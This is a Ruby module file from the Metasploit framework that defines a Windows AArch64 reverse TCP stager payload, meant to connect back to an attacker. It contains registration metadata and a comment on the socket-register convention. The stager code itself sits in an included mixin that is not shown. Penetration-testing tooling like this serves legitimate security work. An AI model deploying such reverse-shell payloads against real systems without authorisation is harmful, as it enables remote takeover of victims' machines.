# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 716

  include Msf::Payload::Stager
  include Msf::Payload::Windows::ReverseTcp_Aarch64

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Windows AArch64 Reverse TCP Stager',
        'Description' => 'Connect back to the attacker (Windows AArch64)',
        'Author' => [ 'vinicius-batistella' ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_AARCH64,
        # Not picked up by Stager#encode_stage_preserved_registers (the regex requires
        # 3+ alpha chars after "sock", and x0 has a digit), since the handoff of the
        # connected socket in x0 is hardcoded in ReverseTcp_Aarch64's stager assembly.
        # Kept so PayloadCompat => Convention on stages/windows/aarch64/shell still
        # pairs this stager with that stage.
        'Convention' => 'sockx0',
        'Handler' => Msf::Handler::ReverseTcp,
        'Stager' => { 'RequiresMidstager' => false }
      )
    )
  end
end
